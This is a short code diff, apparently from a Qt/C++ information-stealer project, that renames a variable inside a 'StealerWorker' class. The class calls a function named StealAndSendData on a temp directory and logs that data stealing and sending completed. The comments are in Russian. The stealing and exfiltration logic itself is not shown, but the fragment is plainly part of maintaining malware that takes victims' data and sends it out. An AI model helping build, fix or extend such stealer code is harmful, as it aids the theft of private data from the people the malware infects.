@@ -26,9 +26,9 @@ public slots:
         }
 
         try {
-            std::string result = window->StealAndSendData(tempDir); // Сохраняем результат
+            std::string processResult = window->StealAndSendData(tempDir); // Переименована переменная
             qDebug("StealerWorker: Data stealing and sending completed successfully");
-            emit result(QString::fromStdString(result)); // Отправляем результат через сигнал
+            emit result(QString::fromStdString(processResult)); // Отправляем результат через сигнал
         } catch (const std::exception& e) {
             qWarning("StealerWorker: Exception during data stealing: %s", e.what());
             emit result("Ошибка: " + QString::fromStdString(e.what())); // Отправляем ошибку
